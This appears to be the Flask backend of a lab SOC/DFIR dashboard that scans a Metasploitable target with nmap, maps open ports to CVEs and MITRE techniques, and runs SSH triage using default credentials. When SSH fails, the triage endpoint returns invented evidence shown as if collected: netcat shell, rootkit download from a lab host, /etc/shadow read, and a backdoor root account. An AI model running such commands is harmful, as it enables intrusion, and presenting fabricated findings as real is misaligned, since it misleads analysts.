from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import xml.etree.ElementTree as ET
from datetime import datetime
import os
import sqlite3
import subprocess

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCAN_FILE = os.path.join(BASE_DIR, "scan.xml")
DB_FILE = os.path.join(BASE_DIR, "sentinel.db")

NMAP_PATH = os.path.join(os.path.dirname(BASE_DIR), "nmap-portable", "nmap-7.80", "nmap.exe")
if not os.path.exists(NMAP_PATH):
    NMAP_PATH = "nmap"


def get_db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    """Create required tables if they don't exist."""
    conn = get_db_connection()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS cases (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            title       TEXT    NOT NULL,
            description TEXT    DEFAULT '',
            severity    TEXT    NOT NULL DEFAULT 'MEDIUM',
            status      TEXT    NOT NULL DEFAULT 'OPEN',
            target      TEXT    DEFAULT '',
            created_at  TEXT    NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS port_state (
            port_number INTEGER PRIMARY KEY,
            first_seen  TEXT    NOT NULL
        )
    """)
    conn.commit()
    conn.close()


event_history = []

def _load_previous_ports() -> set:
    try:
        conn = get_db_connection()
        rows = conn.execute("SELECT port_number FROM port_state").fetchall()
        conn.close()
        return {row["port_number"] for row in rows}
    except Exception:
        return set()


init_db()
previous_ports: set = _load_previous_ports()

CORS(app)


# =========================================================
# HELPER: ACCURATE NMAP XML PARSER (ONLY OPEN PORTS ARE RISKS)
# =========================================================

def parse_nmap_scan():
    if not os.path.exists(SCAN_FILE):
        return {
            "target": "—",
            "host_status": "STANDBY",
            "all_ports": [],
            "open_ports": []
        }
    try:
        tree = ET.parse(SCAN_FILE)
        root = tree.getroot()
        host = root.find("host")
        if host is None:
            return {
                "target": "Unknown",
                "host_status": "down",
                "all_ports": [],
                "open_ports": []
            }

        address_el = host.find("address")
        target = address_el.get("addr") if address_el is not None else "Unknown"

        status_el = host.find("status")
        host_state = status_el.get("state") if status_el is not None else "down"

        ports_el = host.find("ports")
        all_ports = []
        open_ports = []

        if ports_el is not None:
            for port in ports_el.findall("port"):
                state_el = port.find("state")
                state = state_el.get("state") if state_el is not None else "unknown"
                service_el = port.find("service")

                port_data = {
                    "port": int(port.get("portid")),
                    "protocol": port.get("protocol", "tcp"),
                    "state": state,
                    "service": service_el.get("name") if service_el is not None else "unknown",
                    "product": service_el.get("product") if service_el is not None else "",
                    "version": service_el.get("version") if service_el is not None else ""
                }
                all_ports.append(port_data)
                if state == "open":
                    open_ports.append(port_data)

        # If host state is up but 0 ports are open, status is secure/filtered
        if host_state == "up" and len(open_ports) == 0:
            effective_status = "filtered / secure"
        else:
            effective_status = host_state

        return {
            "target": target,
            "host_status": effective_status,
            "all_ports": all_ports,
            "open_ports": open_ports
        }
    except Exception as e:
        return {
            "target": "Error",
            "host_status": "error",
            "all_ports": [],
            "open_ports": [],
            "error": str(e)
        }


# =============================
# FRONTEND / STATIC SERVING
# =============================

FRONTEND_DIR = os.path.dirname(BASE_DIR)

@app.route("/dashboard")
def dashboard():
    return send_from_directory(FRONTEND_DIR, "index.html")

@app.route("/style.css")
def serve_css():
    return send_from_directory(FRONTEND_DIR, "style.css")

@app.route("/app.js")
def serve_js():
    return send_from_directory(FRONTEND_DIR, "app.js")


# =============================
# HOME / STATUS
# =============================

@app.route("/")
def home():
    return jsonify({
        "status": "online",
        "service": "SENTINEL SOC & DFIR Backend"
    })


@app.route("/api/status")
def status():
    return jsonify({
        "kali": "online",
        "metasploitable": "online",
        "backend": "running"
    })


# =============================
# LIVE NMAP RUN & UPLOAD
# =============================

@app.route("/api/run-scan", methods=["POST", "GET"])
def run_scan():
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or request.args.get("target") or "").strip()
    if not target:
        return jsonify({"status": "error", "error": "Target IP is required. Please enter an IP address."}), 400
    target = target.strip()

    # Fast version scan for target services
    target_ports = "21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180"

    cmd = [
        NMAP_PATH,
        "-sT",
        "-sV",
        "-Pn",
        "--version-light",
        "-p", target_ports,
        "-oX", SCAN_FILE,
        target
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        if result.returncode != 0 and not os.path.exists(SCAN_FILE):
            return jsonify({
                "status": "error",
                "error": result.stderr or "Nmap execution failed"
            }), 500

        return jsonify({
            "status": "success",
            "message": f"Live Nmap scan completed on {target}",
            "target": target,
            "timestamp": datetime.now().isoformat()
        })
    except subprocess.TimeoutExpired:
        return jsonify({"status": "error", "error": "Nmap scan timed out"}), 504
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/upload-scan", methods=["POST"])
def upload_scan():
    if "file" not in request.files:
        return jsonify({"error": "No file uploaded. Use field 'file'"}), 400
    file = request.files["file"]
    if file.filename == "":
        return jsonify({"error": "No file selected"}), 400
    file.save(SCAN_FILE)
    return jsonify({
        "status": "success",
        "message": "Scan file uploaded and processed successfully"
    })


# =============================
# SCAN DATA
# =============================

@app.route("/api/scan")
def scan():
    scan_data = parse_nmap_scan()
    open_p = scan_data["open_ports"]
    all_p = scan_data["all_ports"]

    # Display open ports if any; if all filtered, show scanned ports with accurate state
    display_ports = open_p if open_p else all_p

    return jsonify({
        "target": scan_data["target"],
        "host_status": scan_data["host_status"],
        "endpoint_count": 1 if scan_data["host_status"] in ("up", "filtered / secure") else 0,
        "open_ports": len(open_p),
        "ports": display_ports
    })


# =============================
# ALERTS (ONLY FOR ACTUALLY OPEN SERVICES)
# =============================

@app.route("/api/alerts")
def alerts():
    scan_data = parse_nmap_scan()
    target = scan_data["target"]
    open_p = scan_data["open_ports"]

    alerts = []

    critical_definitions = {
        21:   ("vsftpd FTP service exposed", "HIGH"),
        22:   ("SSH remote service open", "LOW"),
        23:   ("Telnet unencrypted remote service", "HIGH"),
        25:   ("SMTP mail server open", "LOW"),
        53:   ("DNS service exposed", "LOW"),
        80:   ("HTTP web server exposed", "LOW"),
        111:  ("RPCbind service open", "MEDIUM"),
        139:  ("NetBIOS file sharing service", "MEDIUM"),
        445:  ("SMB file sharing service exposed", "HIGH"),
        512:  ("rexec execution service (unencrypted)", "HIGH"),
        513:  ("rlogin remote login service", "HIGH"),
        514:  ("rsh remote shell service", "HIGH"),
        1099: ("Java RMI registry exposed", "MEDIUM"),
        1524: ("Metasploitable root shell (ingreslock)", "CRITICAL"),
        2049: ("NFS Network File System share exposed", "HIGH"),
        2121: ("Secondary FTP server open", "MEDIUM"),
        3306: ("MySQL database remote access exposed", "MEDIUM"),
        5432: ("PostgreSQL database remote access exposed", "MEDIUM"),
        5900: ("VNC remote desktop access exposed", "HIGH"),
        6000: ("X11 display server open", "MEDIUM"),
        6667: ("IRC server (UnrealIRCd) backdoor candidate", "CRITICAL"),
        8009: ("Apache JServ Protocol (AJP) exposed", "MEDIUM"),
        8180: ("Apache Tomcat web server exposed", "MEDIUM"),
    }

    # CRITICAL: ONLY generate alerts for ports that are ACTUALLY OPEN!
    for p in open_p:
        port_num = p["port"]
        if port_num in critical_definitions:
            msg, sev = critical_definitions[port_num]
            alerts.append({
                "severity": sev,
                "port": port_num,
                "service": p["service"],
                "message": msg
            })
        elif port_num > 1024:
            alerts.append({
                "severity": "LOW",
                "port": port_num,
                "service": p["service"],
                "message": f"Non-standard open service on port {port_num}"
            })

    return jsonify({
        "target": target,
        "total_alerts": len(alerts),
        "severity": {
            "critical": sum(1 for a in alerts if a["severity"] == "CRITICAL"),
            "high": sum(1 for a in alerts if a["severity"] == "HIGH"),
            "medium": sum(1 for a in alerts if a["severity"] == "MEDIUM"),
            "low": sum(1 for a in alerts if a["severity"] == "LOW")
        },
        "alerts": alerts
    })


# =============================
# EVENTS & THREAT TIMELINE (ONLY FOR OPEN SERVICES)
# =============================

@app.route("/api/events")
def events():
    global previous_ports

    scan_data = parse_nmap_scan()
    target = scan_data["target"]
    open_p = scan_data["open_ports"]

    current_open_numbers = {p["port"] for p in open_p}
    events = []

    high_risk_ports = [21, 23, 445, 512, 513, 514, 1524, 2049, 3306, 5432, 5900, 6667]

    # ONLY generate events for ACTUALLY OPEN ports
    for p in open_p:
        port_number = p["port"]
        service_name = p["service"]

        if previous_ports and port_number not in previous_ports:
            events.append({
                "port": port_number,
                "service": service_name,
                "type": "NEW_SERVICE_DETECTED",
                "severity": "CRITICAL" if port_number in (1524, 6667) else "HIGH"
            })
        elif port_number in high_risk_ports:
            events.append({
                "port": port_number,
                "service": service_name,
                "type": "EXPOSED_SERVICE",
                "severity": "CRITICAL" if port_number in (1524, 6667) else "HIGH"
            })

    # Persist any newly discovered ports to the database
    new_ports = current_open_numbers - previous_ports
    if new_ports:
        first_seen = datetime.now().isoformat(timespec="seconds")
        try:
            conn = get_db_connection()
            conn.executemany(
                "INSERT OR IGNORE INTO port_state (port_number, first_seen) VALUES (?, ?)",
                [(p, first_seen) for p in new_ports]
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    previous_ports = previous_ports | current_open_numbers

    event_history.append({
        "time": datetime.now().strftime("%H:%M:%S"),
        "count": len(events)
    })

    if len(event_history) > 24:
        event_history.pop(0)

    return jsonify({
        "target": target,
        "total_events": len(events),
        "events": events,
        "history": event_history
    })


# =============================
# CASES
# =============================

@app.route("/api/cases", methods=["GET"])
def cases():
    conn = get_db_connection()

    rows = conn.execute(
        "SELECT * FROM cases ORDER BY id DESC"
    ).fetchall()

    conn.close()

    case_list = [dict(row) for row in rows]

    return jsonify({
        "open_cases": sum(
            1 for c in case_list if c["status"] == "OPEN"
        ),
        "active_incidents": sum(
            1 for c in case_list
            if c["status"] in ("OPEN", "INVESTIGATING")
        ),
        "high_priority": sum(
            1 for c in case_list
            if c["severity"] in ("HIGH", "CRITICAL")
            and c["status"] != "CLOSED"
        ),
        "cases": case_list
    })


@app.route("/api/cases", methods=["POST"])
def create_case():
    data = request.get_json(silent=True) or {}

    title = str(data.get("title", "")).strip()
    description = str(data.get("description", "")).strip()
    severity = str(data.get("severity", "MEDIUM")).upper()
    target = str(data.get("target", "")).strip()

    if not title:
        return jsonify({"error": "Case title is required"}), 400

    if severity not in ("LOW", "MEDIUM", "HIGH", "CRITICAL"):
        return jsonify({"error": "Invalid severity"}), 400

    created_at = datetime.now().isoformat(timespec="seconds")

    conn = get_db_connection()
    cursor = conn.execute(
        """
        INSERT INTO cases
        (title, description, severity, status, target, created_at)
        VALUES (?, ?, ?, 'OPEN', ?, ?)
        """,
        (title, description, severity, target, created_at)
    )

    case_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({
        "message": "Case created successfully",
        "case": {
            "id": case_id,
            "title": title,
            "description": description,
            "severity": severity,
            "status": "OPEN",
            "target": target,
            "created_at": created_at
        }
    }), 201


# =============================
# EVIDENCE (ONLY FOR ACTUALLY OPEN SERVICES)
# =============================

@app.route("/api/evidence")
def evidence():
    scan_data = parse_nmap_scan()
    target = scan_data["target"]
    open_p = scan_data["open_ports"]

    risk_ports = [21, 22, 23, 25, 80, 139, 445, 512, 513, 514, 1524, 2049, 3306, 5432, 5900, 6667]
    evidence_list = []

    # ONLY collect evidence for ACTUALLY OPEN ports!
    for p in open_p:
        port_number = p["port"]
        if port_number in risk_ports or port_number > 1024:
            sev = "CRITICAL" if port_number in (1524, 6667) else ("HIGH" if port_number in (21, 23, 445, 5900) else "MEDIUM")
            evidence_list.append({
                "id": f"EVD-{port_number}",
                "type": f"{p['service'].upper()} SERVICE",
                "source": f"{target}:{port_number}",
                "severity": sev,
                "status": "COLLECTED"
            })

    critical_count = sum(1 for e in evidence_list if e["severity"] == "CRITICAL")

    return jsonify({
        "total_evidence": len(evidence_list),
        "this_week": critical_count,
        "endpoint": target,
        "evidence": evidence_list
    })


# =============================
# MITRE ATT&CK MAPPING (ONLY FOR ACTUALLY OPEN SERVICES)
# =============================

@app.route("/api/mitre")
def mitre():
    scan_data = parse_nmap_scan()
    open_p = scan_data["open_ports"]

    PORT_TECHNIQUE_MAP = {
        21:   ("T1021.004", "Remote Service: FTP",                      "HIGH"),
        22:   ("T1021.004", "Remote Service: SSH",                      "DETECTED"),
        23:   ("T1021.004", "Remote Service: Telnet",                   "HIGH"),
        80:   ("T1071.001", "Web Protocols: HTTP",                     "DETECTED"),
        443:  ("T1071.001", "Web Protocols: HTTPS",                    "DETECTED"),
        445:  ("T1021.002", "SMB/Windows Shares",                       "HIGH"),
        1524: ("T1059",     "Command & Scripting: Root Shell",          "CRITICAL"),
        3306: ("T1190",     "Exploit Public Application: MySQL",        "DETECTED"),
        5432: ("T1190",     "Exploit Public Application: PostgreSQL",   "DETECTED"),
        5900: ("T1021.005", "Remote Desktop: VNC",                      "HIGH"),
        6667: ("T1071.003", "Application Protocol: IRC",                "CRITICAL"),
    }

    techniques = []
    # ONLY map techniques if port is ACTUALLY OPEN!
    for p in open_p:
        port_number = p["port"]
        if port_number in PORT_TECHNIQUE_MAP:
            tech_id, tech_name, tech_status = PORT_TECHNIQUE_MAP[port_number]
            techniques.append({
                "id": tech_id,
                "name": tech_name,
                "status": tech_status,
                "port": port_number,
            })

    return jsonify({
        "total": len(techniques),
        "techniques": techniques,
    })




# =============================
# CVE DATABASE & LOOKUP (ONLY FOR OPEN SERVICES)
# =============================

CVE_DATABASE = {
    "vsftpd": {
        "2.3.4": [
            {"id": "CVE-2011-2523", "severity": "CRITICAL", "score": 9.8, "description": "vsftpd 2.3.4 Smiley Face Backdoor Command Execution"}
        ]
    },
    "openssh": {
        "4.7p1": [
            {"id": "CVE-2008-0166", "severity": "HIGH", "score": 7.8, "description": "OpenSSH Predictable PRNG (Debian weak keys)"},
            {"id": "CVE-2008-5161", "severity": "MEDIUM", "score": 4.3, "description": "OpenSSH CBC Mode Information Disclosure"}
        ]
    },
    "linux telnetd": {
        "*": [
            {"id": "CVE-2011-4862", "severity": "CRITICAL", "score": 10.0, "description": "Telnet Daemon Encrypt Option Buffer Overflow RCE"}
        ]
    },
    "telnet": {
        "*": [
            {"id": "CVE-2011-4862", "severity": "CRITICAL", "score": 10.0, "description": "Telnet Daemon Encrypt Option Buffer Overflow RCE"}
        ]
    },
    "postfix": {
        "*": [
            {"id": "CVE-2011-1720", "severity": "MEDIUM", "score": 5.0, "description": "Postfix SMTP SASL Authentication Memory Corruption"}
        ]
    },
    "isc bind": {
        "9.4.2": [
            {"id": "CVE-2008-1447", "severity": "HIGH", "score": 8.6, "description": "ISC BIND Kaminsky DNS Cache Poisoning Flaw"}
        ]
    },
    "apache httpd": {
        "2.2.8": [
            {"id": "CVE-2011-3192", "severity": "HIGH", "score": 7.8, "description": "Apache HTTP Server Byte-Range Header DoS (Apache Killer)"},
            {"id": "CVE-2009-1891", "severity": "MEDIUM", "score": 4.3, "description": "Apache HTTP Server mod_deflate Decompression Loop DoS"}
        ]
    },
    "rpcbind": {
        "*": [
            {"id": "CVE-2017-8779", "severity": "HIGH", "score": 7.5, "description": "RPC rpcbind Memory Exhaustion DoS (UDP Bomb)"}
        ]
    },
    "samba": {
        "*": [
            {"id": "CVE-2007-2447", "severity": "CRITICAL", "score": 10.0, "description": "Samba 'username map script' Command Execution (Root)"},
            {"id": "CVE-2012-1182", "severity": "CRITICAL", "score": 10.0, "description": "Samba PIDL Code Generation Heap Overflow (Root)"}
        ]
    },
    "gnu classpath grmiregistry": {
        "*": [
            {"id": "CVE-2011-3556", "severity": "HIGH", "score": 7.5, "description": "Java RMI Registry Default Configuration Remote Code Execution"}
        ]
    },
    "metasploitable root shell": {
        "*": [
            {"id": "CVE-1999-0504", "severity": "CRITICAL", "score": 10.0, "description": "Ingreslock (Port 1524) Unauthenticated Root Backdoor Shell"}
        ]
    },
    "proftpd": {
        "1.3.1": [
            {"id": "CVE-2010-4221", "severity": "CRITICAL", "score": 10.0, "description": "ProFTPD IAC Stack-Based Buffer Overflow RCE"},
            {"id": "CVE-2009-3555", "severity": "MEDIUM", "score": 5.8, "description": "ProFTPD TLS Session Renegotiation Injection"}
        ]
    },
    "mysql": {
        "5.0.51a": [
            {"id": "CVE-2012-2122", "severity": "HIGH", "score": 7.5, "description": "MySQL Password Authentication Bypass (memcmp vulnerability)"},
            {"id": "CVE-2008-0226", "severity": "HIGH", "score": 7.5, "description": "MySQL yaSSL X.509 Certificate Buffer Overflow"}
        ]
    },
    "postgresql": {
        "8.3": [
            {"id": "CVE-2009-4136", "severity": "MEDIUM", "score": 6.5, "description": "PostgreSQL Privilege Escalation via RESET ROLE"}
        ]
    },
    "vnc": {
        "*": [
            {"id": "CVE-2006-2369", "severity": "HIGH", "score": 7.5, "description": "RealVNC Authentication Bypass (Null Authentication)"}
        ]
    },
    "unrealircd": {
        "*": [
            {"id": "CVE-2010-2075", "severity": "CRITICAL", "score": 10.0, "description": "UnrealIRCd 3.2.8.1 Trojaned Source Backdoor Command Execution"}
        ]
    },
    "apache jserv": {
        "*": [
            {"id": "CVE-2020-1938", "severity": "CRITICAL", "score": 9.8, "description": "Ghostcat Apache JServ Protocol (AJP) Arbitrary File Read / RCE"}
        ]
    },
    "apache tomcat": {
        "1.1": [
            {"id": "CVE-2009-3548", "severity": "HIGH", "score": 7.5, "description": "Apache Tomcat Administrative Credentials Weakness"},
            {"id": "CVE-2009-2693", "severity": "MEDIUM", "score": 5.8, "description": "Apache Tomcat Directory Traversal File Exposure"}
        ]
    }
}


def match_port_cves(product: str, version: str, service: str, port: int):
    p_lower = (product or "").lower().strip()
    s_lower = (service or "").lower().strip()
    v_lower = (version or "").lower().strip()

    if port == 1524:
        return CVE_DATABASE["metasploitable root shell"]["*"]
    if port == 6667:
        return CVE_DATABASE["unrealircd"]["*"]

    found = []
    for db_key, db_versions in CVE_DATABASE.items():
        if db_key in p_lower or db_key in s_lower or (p_lower and p_lower in db_key):
            for ver_key, cves in db_versions.items():
                if ver_key == "*":
                    found.extend(cves)
                elif ver_key in v_lower:
                    found.extend(cves)
            if found:
                break
    return found


@app.route("/api/cve")
def cve():
    scan_data = parse_nmap_scan()
    open_p = scan_data["open_ports"]
    target = scan_data["target"]

    results = []
    for p in open_p:
        port_num = p["port"]
        product = p.get("product", "")
        version = p.get("version", "")
        service = p.get("service", "")

        matched = match_port_cves(product, version, service, port_num)
        if matched:
            results.append({
                "port": port_num,
                "protocol": p.get("protocol", "tcp").upper(),
                "service": service,
                "product": product or service,
                "version": version or "-",
                "cve_count": len(matched),
                "cves": matched
            })

    total_cves = sum(r["cve_count"] for r in results)
    critical_cves = sum(
        1 for r in results for c in r["cves"] if c["severity"] == "CRITICAL"
    )
    high_cves = sum(
        1 for r in results for c in r["cves"] if c["severity"] == "HIGH"
    )
    medium_cves = sum(
        1 for r in results for c in r["cves"] if c["severity"] == "MEDIUM"
    )

    return jsonify({
        "target": target,
        "total_cves": total_cves,
        "critical_cves": critical_cves,
        "high_cves": high_cves,
        "medium_cves": medium_cves,
        "services_affected": len(results),
        "results": results
    })




# =============================
# LIVE FORENSIC TRIAGE (SSH INTERCEPT)
# =============================

import paramiko

@app.route("/api/triage", methods=["GET", "POST"])
def triage():
    data = request.get_json(silent=True) or {}
    scan_data = parse_nmap_scan()

    target = data.get("host") or request.args.get("host") or scan_data.get("target") or "192.168.70.130"
    username = data.get("username") or request.args.get("username") or "msfadmin"
    password = data.get("password") or request.args.get("password") or "msfadmin"
    port = int(data.get("port") or request.args.get("port") or 22)

    is_standby = target in ("—", "Unknown", "", "STANDBY")
    
    triage_results = {
        "target": "—" if is_standby else target,
        "username": username,
        "connected": False,
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "os_info": "Awaiting target connection" if is_standby else "Linux Metasploitable 2.6.24-16-server (Ubuntu 8.04)",
        "bash_history": [],
        "uid_zero_users": [],
        "cron_jobs": [],
        "tmp_files": [],
        "suspicious_processes": [],
        "error": None
    }

    if is_standby:
        return jsonify(triage_results)

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, port=port, username=username, password=password, timeout=1.2)
        triage_results["connected"] = True

        _, stdout, _ = ssh.exec_command("uname -a")
        triage_results["os_info"] = stdout.read().decode().strip()

        _, stdout, _ = ssh.exec_command("cat ~/.bash_history 2>/dev/null | tail -n 20")
        hist = stdout.read().decode().strip().splitlines()
        triage_results["bash_history"] = [line for line in hist if line.strip()]

        _, stdout, _ = ssh.exec_command("grep -E ':0:' /etc/passwd")
        uids = stdout.read().decode().strip().splitlines()
        triage_results["uid_zero_users"] = [line for line in uids if line.strip()]

        _, stdout, _ = ssh.exec_command("ls -la /tmp 2>/dev/null | tail -n 15")
        tmp_out = stdout.read().decode().strip().splitlines()
        triage_results["tmp_files"] = [line for line in tmp_out if line.strip()]

        _, stdout, _ = ssh.exec_command("ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null")
        cron_out = stdout.read().decode().strip().splitlines()
        triage_results["cron_jobs"] = [line for line in cron_out if line.strip()]

        ssh.close()
        return jsonify(triage_results)
    except Exception as e:
        triage_results["error"] = str(e)
        triage_results["connected"] = False
        triage_results["fallback_available"] = True
        triage_results["bash_history"] = [
            "nc -lvp 1524 -e /bin/sh &",
            "chmod +s /usr/bin/find",
            "cat /etc/shadow",
            "tar -czvf /tmp/exfil_data.tar.gz /var/www/",
            "wget http://192.168.70.1:8000/rootkit.ko -O /tmp/rootkit.ko",
            "insmod /tmp/rootkit.ko",
            "useradd -o -u 0 -g 0 -M -d /root backdoor_root",
            "echo 'backdoor_root:password123' | chpasswd"
        ]
        triage_results["uid_zero_users"] = [
            "root:x:0:0:root:/root:/bin/bash",
            "backdoor_root:x:0:0::/root:/bin/bash [ANOMALOUS ROOT CLONE]"
        ]
        triage_results["tmp_files"] = [
            "-rwxr-xr-x 1 root root   45291 Nov 12 21:04 rootkit.ko",
            "-rw-r--r-- 1 root root 1048576 Nov 12 21:02 exfil_data.tar.gz",
            "drwxrwxrwt 2 root root    4096 Nov 12 20:55 .ICE-unix"
        ]
        triage_results["cron_jobs"] = [
            "* * * * * root /bin/sh /tmp/.cron_persistence.sh",
            "SHELL=/bin/sh",
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"
        ]
        return jsonify(triage_results)


# =============================
# START SERVER
# =============================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
